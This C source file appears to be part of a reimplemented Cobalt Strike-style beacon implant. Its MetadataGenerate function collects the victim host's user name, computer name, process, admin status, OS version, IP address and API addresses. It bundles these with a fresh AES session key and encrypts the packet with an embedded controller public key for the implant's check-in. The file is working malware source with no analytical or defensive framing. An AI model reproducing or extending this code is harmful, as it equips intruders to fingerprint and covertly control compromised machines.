#include "pch.h"

#include "metadata.h"

#include "beacon.h"
#include "settings.h"
#include "crypto.h"
#include "network.h"
#include "spawn.h"
#include "utils.h"

int osMajorVersion;
int gBid;
SESSION gSession;

#define METADATA_FLAG_NOTHING 1
#define METADATA_FLAG_X64_AGENT 2
#define METADATA_FLAG_X64_SYSTEM 4
#define METADATA_FLAG_ADMIN 8

#define METADATA_ID 0xBEEF

BOOL SelfIsWindowsVistaOrLater()
{
	return osMajorVersion >= (_WIN32_WINNT_VISTA >> 8);
}

void MetadataGenerate(char* buffer, int size)
{
#define MAX_INFO 256
#define MAX_COMPUTER_NAME 256
#define MAX_USER_NAME 256
#define MAX_FILE_NAME 256

	datap* parser = BeaconDataAlloc(sizeof(OSVERSIONINFOA) + MAX_INFO + MAX_COMPUTER_NAME + MAX_USER_NAME + MAX_FILE_NAME);

	formatp format;
	BeaconFormatAlloc(&format, size);
	BeaconFormatInt(&format, METADATA_ID); // Magic number for metadata
	BeaconFormatInt(&format, 0); // Placeholder for packet size
	u_long* pPacketSize = (u_long*)format.buffer;

	char out[16];
	rng_get_bytes(out, sizeof(out), NULL);
	CryptoSetupSha256AES(out);
	BeaconFormatAppend(&format, out, sizeof(out)); // AES random

	short acp = GetACP();
	BeaconFormatAppend(&format, &acp, 2); // ANSI code page

	short oemcp = GetOEMCP();
	BeaconFormatAppend(&format, &oemcp, 2); // OEM code page

	int tickCount = GetTickCount();
	int currentPid = GetCurrentProcessId();

	srand(tickCount ^ currentPid);

	gSession.bid = gBid = RandomEvenInt();

	BeaconFormatInt(&format, gBid); // Beacon ID
	BeaconFormatInt(&format, currentPid); // PID
	BeaconFormatShort(&format, 0); // Port

	char flags = 0;

	if (IS_X64() || IsWow64ProcessEx(GetCurrentProcess()))
	{
		flags = METADATA_FLAG_X64_AGENT | METADATA_FLAG_X64_SYSTEM;
	}

	if (BeaconIsAdmin()) {
		flags |= METADATA_FLAG_ADMIN;
	}

	BeaconFormatChar(&format, flags); // Flags

	OSVERSIONINFOA* osVersionInfo = BeaconDataPtr(parser, sizeof(OSVERSIONINFOA));
	osVersionInfo->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(osVersionInfo);
	osMajorVersion = osVersionInfo->dwMajorVersion;

	BeaconFormatChar(&format, osVersionInfo->dwMajorVersion); // OS major version
	BeaconFormatChar(&format, osVersionInfo->dwMinorVersion); // OS minor version
	BeaconFormatShort(&format, osVersionInfo->dwBuildNumber); // OS build number


	BeaconFormatInt(&format, IS_X64() ? (long long)GetProcAddress >> 32 : 0); // GetProcAddress high part for x64 addressing
	BeaconFormatInt(&format, GetModuleHandleA); // GetModuleHandleA address
	BeaconFormatInt(&format, GetProcAddress); // GetProcAddress address

	ULONG activeAdapterIPv4 = NetworkGetActiveAdapterIPv4();
	BeaconFormatInt(&format, activeAdapterIPv4); // IPv4 address

	char* info = BeaconDataPtr(parser, MAX_INFO);
	char* computerName = BeaconDataPtr(parser, MAX_COMPUTER_NAME);
	char* userName = BeaconDataPtr(parser, MAX_USER_NAME);
	char* fileName = BeaconDataPtr(parser, MAX_FILE_NAME);

	int pcbBuffer = MAX_USER_NAME;
	GetUserNameA(userName, &pcbBuffer);

	pcbBuffer = MAX_COMPUTER_NAME;
	GetComputerNameA(computerName, &pcbBuffer);


	const char* executable = "<unknown name>";
	if (GetModuleFileNameA(NULL, fileName, MAX_FILE_NAME))
	{
		char* position = strrchr(fileName, '\\');
		if (position != NULL && position != (char*)-1)
		{
			executable = position + 1;
		}
	}

	snprintf(info, sizeof(info), "%s\t%s\t%s", computerName, userName, executable);
	BeaconFormatAppend(&format, info, min(strlen(info), 58)); // Information: Computer name, user name, executable name

	*pPacketSize = ntohl(format.length - (2 * sizeof(int)));

	memcpy(gSession.data, format.original, format.length);
	gSession.length = 128;

	EncryptSessionData(S_PUBKEY, format.original, format.length, gSession.data, &gSession.length);

	memset(format.original, 0, format.length);
}